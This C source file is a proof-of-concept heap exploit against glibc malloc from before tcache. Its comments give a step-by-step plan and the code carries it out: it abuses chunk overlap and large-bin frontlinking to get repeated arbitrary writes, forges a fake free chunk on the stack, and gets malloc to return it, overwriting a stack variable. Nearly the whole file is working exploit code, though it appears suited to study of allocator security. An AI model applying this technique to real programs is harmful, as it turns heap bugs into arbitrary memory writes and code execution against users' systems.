#include <stdio.h>
#include <stdlib.h>

/* Note
	This PoC does not take into account tcaches, so use a glibc version < 2.26 or manually fill
	the tcaches here beforehand. This basically means as of now: Use a current ubuntu to execute the test.
*/

/* Overview
	Our goal is to achieve the allocation of a smallbin-sized chunk at an arbitrary address. Targets
	of such an allocation may be known libc function hooks or the stack itself.

	Using frontlinking in Glibc's malloc implementation, we first want to achieve the possibility
	of repeated arbitrary writes without corrupting the heap state. By manipulating chunks in
	the unsorted bin (e.g. by use of an overlap), we force chunks with faked link pointers into
	a large bin. We use the least significant byte of faked chunk addresses to write 0x10-aligned
	byte values repeatedly.

	With this setup we create a fake free chunk in an arbitrary location and force its allocation. In
	this POC we allocate a chunk on the stack, overwriting a local stack variable and printing it.
*/
int main() {
	/* Assumptions: 
		1. We assume we can overlap one chunk and repeatedly control its contents
		2. We can free the wrapped chunk multiple times
		3. We have leaks of libc_base and heap_base

		We do not strictly need to be able to free the same buffer multiple times but
		it makes repeating writes easier. Otherwise, overlaps have to be constructed
		using buggy program logic for each byte write.
	*/

	/* Plan:
		0. Have a chunk that overlaps another chunk which we can free multiple times. With this chunk in the unsorted bin, we can fake additional unsorted bin entries of our choosing.
			In general we can achieve inserting an arbitrarily sized {small,large}bin entry into its binlist by
			0.1 Freeing our wrapped chunk (-> gets inserted into unsorted bin)
			0.2 Manipulating the wrapped chunk so the unsorted bin contains another chunk after it in the queue
				0.2.1 set wrapped->bk=fake_chunk;
					State: ??? <- fake <- wrapped <- unsorted 
				0.2.2 allocate exact size match for wrapped // this removes wrapped from unsorted bin
					State: unsorted_bin <- ??? <- fake <- unsorted_bin
				0.2.3 set fake->bk=wrapped;fake_chunk=my_size&(~prev_inuse);wrapped->fd=fake_chunk;wrapped->bk=unsorted_bin
					State: unsorted_bin <- wrapped <- fake <- unsorted_bin
				0.2.4 allocate exact size match of wrapped
					State: unsorted_bin <- unsorted_bin
				-> now the chunk with my_size is inserted in to its bin
			-> note that this is done while only ever freeing one position multiple times
		1. Use 0 to create (fake) large bin chunk inside large bin list that we can control arbitrariliy
		
		Rinse and Repeat:
		2. Create an unsorted (victim) bin chunk with an LSB alignment of our chosing (0x10 aligned)
			- free wrapped
			- set wrapped->bk = victim
			- allocate wrapped
			- State: unsorted <- victim <- unsorted
		3. Add wrapped to the end of the unsorted bin again
			- wrapped->fd=victim; wrapped->bk=unsorted
			- victim->fd=unsorted; victim->bk=wrapped
			- State: unsorted <- wrapped <- victim <- unsorted
		4. Control fake and victim as follows:
			- victim->size=fake->size+0x10; // so victim is inserted after fake in large bin
			- fake->bk_nextsize=target-0x20
			- fake->bk=target2-0x10
		5. Allocate Wrapped
			- This triggers victim to be inserted into its large bin, triggering the front link
			- State: unsorted <- unsorted
			- Side effects:
				- Writes to target and target2
				- fake messed up, victim messed up
		6. Jump to 2: Rinse and Repeat write for other victims/targets

		The following writes are performed using our rinse and repeat strategy
			a) Set forged allocation target chunk size byte (0x60 in our case)
			b) Fill the remaining target chunk's size field with null bytes
			c) Set target->fd and target->bk pointers to complete the "free" target chunk
		7. Insert target into the unsorted bin
		8. Allocate target's size to make malloc return the forged target chunk
		9. Set values relative to our allocation and check that we indeed hit our target
	*/
	char buf[0x100];
	size_t *target1 = (size_t *) buf;
	size_t *target1_pad = (size_t *) (buf+sizeof(size_t));
	size_t *target2 = (size_t *) (buf+2*sizeof(size_t));
	size_t *heap_base, *unsorted_bin;
	size_t *control, *wrapped, *fake, *victim_00, *victim_60, *arbitrary_allocation;
	size_t i;
	// 0. Chunk overlapping other chunks
	control = malloc(0x1000);

	// Insert padding chunk against wilderness
	malloc(0x100);

	// First leak some addresses
	free(control);control = malloc(0x1000);
	heap_base = control-2;
	unsorted_bin = (size_t *)*control;
	printf("=== POC frontlink-based repeated arbitrary write primitive ===\n");
	printf("Got heap_base: %p, unsorted_bin: %p\n", heap_base, unsorted_bin);

	printf("\nInserting fake chunk into large bin...\n");
	/* We are creating the chunks at the following offsets to control's data base:
		- wrapped at offset 0x20: 4 Qwords apart from control's data base)
		- victim at offset 0x20+0x30=0x50: 10 Qwords
		- fake at offset 0x50+0x30=0x80: 16 Qwords
	*/
	wrapped = control+4;
	victim_60 = control+10;
	victim_00 = (size_t *)((((size_t)control)+0x100)&~0xff); // this happens to work out here but we have to take care not to override other chunk data if we blindly align like this
	fake = control + 16;

	#define WRAPPED_SIZE 0x100
	#define WRAPPED_NEXT_SIZE 0x20
	wrapped[0] = 0;// wrapped->prev_size
	wrapped[1] = WRAPPED_SIZE | 0x1; // wrapped->size
	wrapped[WRAPPED_SIZE/sizeof(size_t)+1] = WRAPPED_NEXT_SIZE | 0x1; // next_chunk(wrapped)->size has to indicate prev_inuse
	wrapped[WRAPPED_SIZE/sizeof(size_t)+WRAPPED_NEXT_SIZE/sizeof(size_t)+1] = 1; //prev_inuse(next_chunk(next_chunk(wrapped))) has to be 1 to avoid foward coalescing

	// 0.1
	// Now wrapped should have been set up to be free'able
	free(wrapped+2);

	// 0.2.1
	// Wrapped now is located inside the unsorted bin. Time to add fake to that list
	wrapped[2] = (size_t) unsorted_bin; // wrapped->fd is already set to this, but in case we have to do a full override we have to maintain this pointer's integrity to not run into a corruption during unsorted bin unlinking
	wrapped[3] = (size_t) fake; // wrapped->bk

	// 0.2.2
	wrapped = ((size_t *)malloc(WRAPPED_SIZE-sizeof(size_t)))-2;

	// 0.2.3
	// Next set up fake to point back to wrapped
	#define FAKE_LARGE_SIZE 0x400
	fake[1] = FAKE_LARGE_SIZE;
	fake[3] = (size_t) wrapped; // fake->bk
	wrapped[2] = (size_t) fake; // wrapped->fd, again not needed currently but maybe with later versions of glibc
	wrapped[3] = (size_t) unsorted_bin; // wrapped->bk must point back to unsorted_bin again as unsorted_fd also has this pointer to keep a clean state

	// 0.2.4
	// With fake at the front and wrapped after it in the unsorted bin, now allocate again to clear the unsorted bin while putting fake onto its large bin
	printf("Next WRAPPED_SIZE-8 sized allocation at: %p\n", ((size_t *)malloc(WRAPPED_SIZE-8))-2);

	printf("\nFirst write: Size lsb\n");
	// 2. a)
	victim_60 = control+10;
	// Start rinse and repeat: We want to first set a fake size byte of 0x60
	// Next set up victim in unsorted bin to get the write while inserting it into its large bin
	free(wrapped+2);
	wrapped[3] = (size_t) victim_60; // wrapped->bk
	// Put victim in front this time
	malloc(WRAPPED_SIZE-sizeof(size_t));

	// 3. a)
	// Now set its size and add wrapped to the back of the unsorted bin again
	victim_60[3] = (size_t) wrapped; // victim->bk set to wrapped to fix unsorted bin
	wrapped[2] = (size_t) victim_60;
	wrapped[3] = (size_t) unsorted_bin;

	// 4. a)
	victim_60[1] = FAKE_LARGE_SIZE+0x10; // victim->size has to be higher than our fake largebin chunk
	// Now that victim is sanely set up, we need to set up fake's pointers to the target location
	fake[2] = 0xdeadbeef; // fake->fd we don't care about
	fake[3] = (size_t)(((char *) target1)-0x10); // fake->bk will trigger write to fake->bk->fd so offset 0x10
	fake[4] = 0xdeadbeef; // fake->fd_nextsize we don't care about
	fake[5] = (size_t)(((char *) target2)-0x20); // fake->bk_nextsize will trigger write to fake->bk_nextsize->fd_nextsize so offset 0x20

	// 5. a)
	printf("Before allocation: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);
	malloc(WRAPPED_SIZE-8);
	printf("After allocation: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);

	printf("\nSecond write: Loop completing fake chunk size with null bytes...\n");
	for(i=1; i<8; ++i) {
		// 2. b)
		// Next iteration of rinse and repeat:
		// Next set up victim in unsorted bin to get the write while inserting it into its large bin
		free(wrapped+2);
		wrapped[3] = (size_t) victim_00; // wrapped->bk
		malloc(WRAPPED_SIZE-sizeof(size_t));

		// 3. b)
		// Now set its size and add wrapped to the back of it again
		victim_00[3] = (size_t) wrapped; // victim->bk set to wrapped to fix unsorted bin
		wrapped[2] = (size_t) victim_00;
		wrapped[3] = (size_t) unsorted_bin;

		/*
			We use two targets here just to show that two pointer writes are possible in each iteration.
			One can for example achieve filling some qword with null bytes in only half the iterations.
		*/
		// 4. b)
		victim_00[1] = FAKE_LARGE_SIZE+0x10; // victim->size has to be higher than our fake largebin chunk
		// Now that victim is sanely set up, we need to set up fake's pointers to the target location
		fake[2] = 0xdeadbeef; // fake->fd we don't care about
		fake[3] = (size_t)(((char *) target1)-0x10+i); // fake->bk will trigger write to fake->bk->fd so offset 0x10
		fake[4] = 0xdeadbeef; // fake->fd_nextsize we don't care about
		fake[5] = (size_t)(((char *) target2)-0x20+i); // fake->bk_nextsize will trigger write to fake->bk_nextsize->fd_nextsize so offset 0x20

		// 5. b)
		printf("Before allocation: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);
		malloc(WRAPPED_SIZE-8);
		printf("After allocation: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);	
	}
	
	printf("\nThird write: Set target chunk fd and bk\n");
	// 2. c)
	// One last time rinse and repeat:
	// Next set up victim in unsorted bin to get the write while inserting it into its large bin
	free(wrapped+2);
	wrapped[3] = (size_t) victim_60; // wrapped->bk
	malloc(WRAPPED_SIZE-sizeof(size_t));

	// 3. c)
	// Now set its size and add wrapped to the back of it again
	victim_60[3] = (size_t) wrapped; // victim->bk set to wrapped to fix unsorted bin
	wrapped[2] = (size_t) victim_60;
	wrapped[3] = (size_t) unsorted_bin;

	// 4. c)
	victim_60[1] = FAKE_LARGE_SIZE+0x10; // victim->size has to be higher than our fake largebin chunk
	// Now that victim is sanely set up, we need to set up fake's pointers to the target location
	fake[2] = 0xdeadbeef; // fake->fd we don't care about
	fake[3] = (size_t)(((char *) target1_pad)-0x10); // fake->bk will trigger write to fake->bk->fd so offset 0x10
	fake[4] = 0xdeadbeef; // fake->fd_nextsize we don't care about
	fake[5] = (size_t)(((char *) target2)-0x20); // fake->bk_nextsize will trigger write to fake->bk_nextsize->fd_nextsize so offset 0x20

	// 5. c)
	printf("Before allocation: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);
	malloc(WRAPPED_SIZE-8);
	printf("After allocation:: target1=%016lx,  target1_pad=%016lx\n", *target1, *target1_pad);

	printf("\nHaving done our writes, we set up our target location like this:\ntarget->size=0x%zx, target->fd=%p, target->bk=%p\n", target1[0], (void *)target1[2], (void *)target1[3]);
	// 7. 
	// At this point we set up 24 bytes at an arbitrary location like this at target1:
	// target1->size=0x60, target1->fd=victim, target1->bk=victim
	// We can insert target into the unsorted bin and allocate it from there
	free(wrapped+2);
	wrapped[3] = (size_t) (((char *)target1)-sizeof(size_t)); // wrapped->bk
	// 8.
	arbitrary_allocation = malloc(0x58);
	// 9.
	printf("We now allocate our target size. The allocation went to: %p\n", arbitrary_allocation);
	printf("Now write A's to the new allocation.\n");
	for(i = 0; i<0x58/sizeof(size_t); ++i) {
		arbitrary_allocation[i] = 0x4141414141414141;
	}

	printf("And finally check contents on the stack: %llx\n", (unsigned long long)*target1_pad);

	return 0;
}